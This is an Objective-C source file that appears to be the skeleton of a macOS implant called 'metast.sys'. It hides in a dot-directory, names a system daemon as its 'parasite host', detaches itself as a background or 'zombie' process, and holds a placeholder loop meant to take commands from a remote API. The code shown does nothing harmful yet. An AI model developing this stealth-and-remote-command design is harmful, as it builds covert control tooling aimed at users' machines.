//
//  main.m
//  metast.sys
//
//  Created by Nikola Tesla on 2/27/16.
//  Copyright © 2016 WireTech. All rights reserved.
//

#import <Foundation/Foundation.h>
#include <unistd.h>
#include <sys/stat.h>
#import "MSAPI.h"

#define HOME_DIR "Library/.debug"
#define LOG_OUT ".resources/metastasys.log"
#define PARASITE_HOST "/usr/sbin/usernoted"

void daemonize(void);
void zombify(void);

static int outFd = 0;

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        if (argc > 1) {
            if (strcmp(argv[1], "--daemon") == 0) {
                daemonize();
            } else if (strcmp(argv[1], "--zombie") == 0) {
                zombify();
            }
        }
        NSLog(@"%@", [[NSUUID UUID] UUIDString]);
        while (YES) {
            // Get command from API, execute, send reponse
            NSLog(@"%s", *argv);
            sleep(1);
        }
    }
    return 0;
}

void set_outputs(void) {
    chdir(getenv("HOME"));
    chdir(HOME_DIR);
    close(STDIN_FILENO);
    outFd = open(LOG_OUT, O_WRONLY);
    dup2(outFd, STDOUT_FILENO);
    dup2(outFd, STDERR_FILENO);
}

void daemonize(void) {
    pid_t pid, sid = 0;
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        exit(EXIT_SUCCESS);
    }
    umask(0);
    sid = setsid();
    if (sid < 0) {
        exit(EXIT_FAILURE);
    }
    setpgrp();
    set_outputs();
}

void zombify(void) {
    pid_t pid = fork();
    if (pid > 0 || pid < 0) {
        exit(EXIT_FAILURE);
    }
    set_outputs();
}
